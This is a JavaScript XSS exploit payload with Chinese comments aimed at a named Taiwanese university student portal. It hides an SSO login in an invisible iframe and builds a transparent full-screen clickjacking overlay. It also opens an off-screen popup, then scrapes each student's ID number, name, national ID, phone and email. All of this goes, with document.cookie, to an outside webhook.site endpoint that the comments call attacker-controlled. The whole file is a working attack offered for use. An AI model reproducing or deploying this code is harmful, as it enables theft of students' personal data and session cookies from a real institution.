(async () => {
    // 攻擊者控制的接收端
    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
    
    // SSO 認證 URL
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    
    // 目標數據 API (假設在 ap.itc 域下，即同源)
    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI"; 

    /**
     * 擴大攻擊面：將當前 iframe 擴展至全屏並透明化
     * 這確保了使用者在頁面上的任何點擊都會被我們捕獲
     */
    function expandIframe() {
        try {
            // 嘗試修改當前 iframe 的樣式 (如果父頁面允許)
            // 注意：如果跨域，無法直接修改父頁面的 DOM 來調整 iframe 大小。
            // 但如果我們是在 iframe 內部執行，我們可以嘗試讓自己看起來很大。
            // 更好的方式是：如果 XSS 允許我們注入 HTML，我們應該注入一個全屏的 div 覆蓋層。
            
            // 在 iframe 內部創建一個全屏透明按鈕
            const overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100vw';
            overlay.style.height = '100vh';
            overlay.style.zIndex = '999999';
            overlay.style.background = 'transparent'; // 透明
            overlay.style.cursor = 'default'; // 保持鼠標樣式，不讓用戶起疑
            overlay.id = 'click-jacker';
            document.body.appendChild(overlay);
            
            console.log("Overlay created for click interception.");
        } catch (e) {
            console.error("Failed to expand attack surface:", e);
        }
    }

    /**
     * 嘗試使用隱藏 iframe 進行靜默認證
     * 如果成功，使用者完全無感
     */
    function trySilentAuth() {
        return new Promise((resolve) => {
            const hiddenFrame = document.createElement('iframe');
            hiddenFrame.style.display = 'none';
            hiddenFrame.src = ssoUrl;
            document.body.appendChild(hiddenFrame);
            
            // 給它一點時間加載
            setTimeout(() => {
                // 無法準確判斷跨域 iframe 是否加載完成，只能基於時間猜測
                resolve(true);
            }, 5000); 
        });
    }

    /**
     * 執行攻擊的主邏輯
     */
    async function executeExploit() {
        // 1. 先嘗試靜默認證
        // fetch(webhook + "?status=Attempting_Silent_Auth");
        // await trySilentAuth();

        // 2. 檢查是否已經有數據 (如果靜默認證成功)
        try {
            const checkResp = await fetch(targetUrl);
            if (checkResp.ok && !checkResp.redirected) { // 簡單判斷是否已登入
                 const data = await checkResp.text();
                 if (data.includes("學生學號")) { // 簡單特徵匹配
                     exfiltrateData(data, "Silent_Auth");
                     return; // 成功，結束
                 }
            }
        } catch(e) {}

        // 3. 如果靜默失敗，則部署點擊劫持
        fetch(webhook + "?status=Silent_Failed_Deploying_Clickjack");
        expandIframe();

        const clickHandler = async (e) => {
            // 移除覆蓋層，恢復正常交互，避免用戶生疑
            const overlay = document.getElementById('click-jacker');
            if (overlay) overlay.remove();
            
            // 觸發彈窗認證
            const popup = window.open(ssoUrl, "sso_auth", "width=100,height=100,left=-9999,top=-9999");
            if (popup) {
                try { popup.blur(); window.focus(); } catch(e) {}
                fetch(webhook + "?status=Popup_Launched");
                
                // 等待認證完成
                await new Promise(r => setTimeout(r, 6000));
                try { popup.close(); } catch(e) {}
                
                // 再次嘗試獲取數據
                try {
                    const response = await fetch(targetUrl);
                    const html = await response.text();
                    exfiltrateData(html, "Popup_Auth");
                } catch (err) {
                    fetch(webhook + "?error=" + encodeURIComponent(err.message));
                }
            } else {
                fetch(webhook + "?error=Popup_Blocked_User_Interaction_Required");
            }
        };

        // 綁定到我們創建的全屏覆蓋層
        const overlay = document.getElementById('click-jacker');
        if (overlay) {
            overlay.addEventListener('click', clickHandler, { once: true });
        } else {
            document.addEventListener('click', clickHandler, { once: true });
        }
    }

    /**
     * 數據提取與外傳
     */
    function exfiltrateData(html, method) {
        let info = {};
        try {
            // 正則提取邏輯保持不變，或根據實際 HTML 結構微調
            info.studentId = html.match(/學生學號:[\s\S]*?class="form-control-static">([^<]+)/)?.[1]?.trim();
            info.name = html.match(/學生姓名:[\s\S]*?class="form-control-static">([^<]+)/)?.[1]?.trim();
            info.idCard = html.match(/身分證字號:[\s\S]*?class="form-control-static">([^<]+)/)?.[1]?.trim();
            info.phone = html.match(/手機:[\s\S]*?class="form-control-static">([^<]+)/)?.[1]?.trim();
            info.email = html.match(/E-mail:[\s\S]*?class="form-control-static">([^<]+)/)?.[1]?.trim();
        } catch(e) {}

        fetch(webhook, {
            method: 'POST',
            mode: 'no-cors',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                status: "SUCCESS",
                method: method,
                extracted_data: info,
                raw_html_snippet: html.substring(0, 2000), // 截取前 2000 字符避免過大
                cookie_dump: document.cookie
            })
        });
    }

    // 啟動
    executeExploit();

})();